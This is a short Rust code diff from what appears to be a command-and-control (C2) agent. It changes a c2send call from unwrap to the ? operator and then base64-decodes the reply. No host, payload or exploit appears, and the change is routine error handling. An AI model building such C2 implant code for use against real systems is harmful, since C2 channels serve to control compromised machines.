@@ -105,7 +105,7 @@ impl Profile {
         };
 
         // Send the payload through the configured C2 profile
-        let body = profile.c2send(&req_payload).unwrap();
+        let body = profile.c2send(&req_payload)?;
 
         // Decode the response
         let decoded = general_purpose::STANDARD.decode(body)?;
